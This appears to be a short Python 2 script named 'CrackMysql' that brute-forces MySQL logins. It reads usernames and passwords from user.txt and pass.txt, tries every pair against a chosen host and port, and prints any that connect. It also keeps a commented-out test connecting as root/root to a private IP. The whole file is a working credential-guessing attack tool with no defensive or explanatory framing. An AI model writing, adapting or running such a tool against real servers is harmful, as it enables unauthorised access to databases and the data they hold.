#coding:utf-8
#1x2Bytes
import argparse
import pymysql
import socket
import sys
import threading

#测试代码
'''
try:
    db = pymysql.connect(host="192.168.1.108",port=3306,user="root",passwd="root")
    print "success"
except:
    print "error"
'''

def banner():
    print '''
    
  ____                _    __  __                 _ 
 / ___|_ __ __ _  ___| | _|  \/  |_   _ ___  __ _| |
| |   | '__/ _` |/ __| |/ / |\/| | | | / __|/ _` | |
| |___| | | (_| | (__|   <| |  | | |_| \__ \ (_| | |
 \____|_|  \__,_|\___|_|\_\_|  |_|\__, |___/\__, |_|
                                  |___/        |_| 
 @1x2Bytes
    '''


    



def crackmysql(host,port,user,passwd):

    try:
        db= pymysql.connect(host=host,port=port,user=user,passwd=passwd)
        print"[+] User: %s [+]Password: %s" %(user,passwd)
    except:
        pass

def main():
    parse = argparse.ArgumentParser(description="Mysql Crack")
    parse.add_argument('-a', '--host', type=str, help="IP address")
    parse.add_argument('-p', '--port', type=int, help="PORT number", default=3306)
    args = parse.parse_args()
    if not args.host:
        parse.print_help()
        sys.exit(0)
    host = socket.gethostbyname(args.host)
    port = args.port
    users = open('user.txt')
    for lines in users:
        user = lines.strip('\n')
        passwords =open('pass.txt')
        for line in passwords:
            pwd = line.strip('\n')
            t = threading.Thread(target=crackmysql, args=(host, port, user, pwd))
            t.start()
            t.join()
            #crackmysql(host=host,port=port,user=user,passwd=pwd)

if __name__=="__main__":
    banner()
    main()

